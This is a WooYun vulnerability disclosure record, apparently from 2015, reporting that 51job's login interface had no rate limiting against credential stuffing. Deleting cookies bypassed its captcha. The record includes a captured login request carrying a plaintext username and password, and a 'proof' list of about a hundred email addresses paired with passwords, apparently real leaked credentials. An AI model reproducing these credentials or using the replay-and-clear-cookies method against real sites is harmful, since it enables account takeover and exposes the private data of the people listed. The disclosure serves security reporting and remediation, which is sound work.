{"id": 28791, "wybug_id": "wooyun-2015-0110998", "wybug_title": "前程无忧51job某接口撞库泄露用户登录凭据(有批量账号证明)", "wybug_corp": "前程无忧(51job)", "wybug_author": "路人甲", "wybug_date": "2015-04-29 10:43", "wybug_open_date": "2015-06-17 15:26", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["撞库"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库以大量的用户数据为基础，利用用户相同的注册习惯（相同的用户名和密码），尝试登陆其它的网站。2011年，互联网泄密事件引爆了整个信息安全界，导致传统的用户+密码认证的方式已无法满足现有安全需求。泄露数据包括：天涯：31,758,468条，CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条，共1.2亿条。不管你的网站密码保护的多好，但是面对已经泄露的账号密码，撞库扫号防御还是一个相当重要的环节。 详细说明：      主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号。  仅对单个账号错误出现验证码。删除cookie，可以撞库。 登录接口抓包如下：\nPOST /47107315565447156545/my/My_Pmc.php HTTP/1.1Host: mylogin.51job.comConnection: closeContent-Length: 77Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://my.51job.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://my.51job.com/my/My_SignIn.php?url=&errmsg=UserNameOrPwdErrorAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: RA-Ver: 2.10.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3username=xw@mail%2ezhongxing%2ecom&userpwd=david&login_verify=&url=&x=52&y=26\n   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.成功率高的吓人。看来果然有很多用户。。。。\nssnowman@21cn.com\t5128752zhuqinyu@hotmail.com\tinformTtiGeR@cableplus.com.cn\tsysop123quyansheng@21cn.com\t5418866linshiding@263.net\tloginlsdfstao@tom.com\t730413huoyunfei@hotmail.com\t771111altering@china.com\thyxb-420andytai@china.com\tagnes212liyuncheng@371.net\tinfowebsiney@yeah.net\tsineysoftcaoyijie@371.net\tcaoyijieyang_gao@hotmail.com\t1414gyxfsunwing@163.net\twangmickeygrace-ran@21cn.com\tcomtechmeng_1226@eyou.com\t44476090johnbutton123@sina.com\tlovebrighter@163.net\t900267hnboy@netease.com\t101112billhao@hotmail.com\t888999sypqj@sina.com\t838980zhangguangcheng@21cn.com\t19760502zrbin@263.net\tzrbzrbcaoht@263.net\t19770412twinfo@cmmail.com\ttwsystemeagle_zhou@21cn.com\tzhouyuanlishi@engineer.com.cn\texplorerlihongyi9910@21cn.com\tbugadminzhanghl@netease.com\t720705li_jian_jun@sohu.com\t987773wanglida7905@163.net\t83624585jingzhou_xu@163.com\t19760108heart4u@163.com\t19800229yang_tianyu@263.net\twangjianJenky@NETEASE.COM\t780122kedongzhang@sina.com\t452570priver1999@netease.com\tpriverhelyguk@online.sh.cn\t073011byerlin@163.net\trosehi.rong@gmail.com\tyulingkong!!xujun81@21cn.com\tgao1218menxin@21cn.com\txinmenwxz@csdn.net\t970820siyanmao@163.com\t95421139zuoqiang263@263.net\tzq1972suvi@ddbiz.net\tseastarleafish@163.net\t537226chzhy1@263.net\tkingdomzly_20000@sina.com\t112500774small@sina.com\t741112jerrych@etang.com\tsaplingwangpk@21cn.com\twapekaherrylu@sina.com\t197936hhhyyy@363.net\t343161yuyiw@21cn.com\t001128yoyoyo@163.net\tzch1725qinghou@21cn.com\t666666zhc_mail@163.net\tzhczhchuang_mj@hotmail.com\talixon1973wjh@acbc.com.cn\t770503wpxia@163.net\tabc123hch@baohua.com.cn\tyhchSUNFENG20000@163.net\t751211chengmingdao@sohu.com\t077225lxmsys@sina.com\t322104gdcat2000@citiz.net\tmimibarmdeng@ust.hk\t101112hl76@263.net\ta7v5b4hvrstudio@21cn.com\t9394167liweny@yeah.net\t771220sayhiworld@tom.com\tghp4lilyAcceptYou@263.net\tbencompuzzling@21cn.com\tanniebaojunzh@263.net\t19733288ghua@371.net\tmt1hy9bhwangxxzhiyy@163.net\t953232hmogy@sina.com\t117111hjy7600@cmmail.com\tfjz78509mlzhao@hotmail.com\t1975lcp_true@yeah.net\tlcp978331youpeng99@sina.com\typ781012amber@sina.com\t650005davis_dai@263.net\tafxapimaxh718@hotmail.com\tsoftgirl718congm@21cn.com\tcongjunxuyuan_sf@21cn.com\tadmin123shen502@cableplus.com.cn\tshenlvbintao@263.net\t00000nba_boy@263.net\t771209ie4@21cn.com\t123456tigerliu@bigfoot.com\tliu0615pux@21cn.com\tconfiga7803@sina.com\tanthonyln1103@21cn.com\t730313yekee@21cn.com\tdvlpmentcaohf73@sina.com\tchf1973pipu_wang2000@sina.com\t26418725hotian@163.com\t277000cfrx@netease.com\tfuckyouxw@mail.zhongxing.com\tdavidcalvados@sina.com\t19760527aquila@21cn.com\tsmart1010li_flycat@263.net\tflycatshiyonglin@263.net\tsyl416\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-03 15:25 厂商回复： 谢谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}